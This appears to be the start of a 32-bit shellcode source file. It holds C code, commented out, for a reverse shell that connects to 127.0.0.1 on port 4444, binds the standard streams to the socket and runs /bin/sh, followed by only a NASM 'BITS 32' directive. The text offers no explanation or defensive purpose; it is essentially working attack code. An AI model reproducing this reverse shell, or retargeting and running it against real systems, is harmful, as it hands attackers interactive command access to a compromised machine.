;int main() {
;  int s;
;  struct sockaddr_in c;
;
;
;  c.sin_family = AF_INET;
;  c.sin_port = htons (4444);
;  c.sin_addr.s_addr = inet_addr ("127.0.0.1");
;
;  s = socket (AF_INET, SOCK_STREAM, IPPROTO_IP);
;
;  connect (s, (struct sockaddr *)&c, sizeof (c));
;
;  dup2 (s, STDERR_FILENO);
;  dup2 (s, STDOUT_FILENO);
;  dup2 (s, STDIN_FILENO);
;
;  execve ("/bin/sh", NULL, NULL);
;}


BITS 32


